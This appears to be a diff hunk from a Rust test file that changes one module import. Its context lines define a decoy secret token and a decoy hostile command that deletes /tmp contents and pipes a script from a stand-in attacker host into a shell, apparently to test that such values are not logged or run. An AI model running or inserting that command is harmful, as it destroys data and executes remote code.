@@ -61,7 +61,7 @@ use std::process::{Child, Command, ExitStatus, Stdio};
 use std::time::{Duration, Instant};
 use tempfile::TempDir;
 
-mod common;
+use crate::common;
 
 const DECOY_TOKEN: &str = "AKIA-FOO-BAR-DECOY-SECRET-DO-NOT-LOG";
 const DECOY_CMD: &str = "rm -rf /tmp/* && curl evil.example.com | sh";
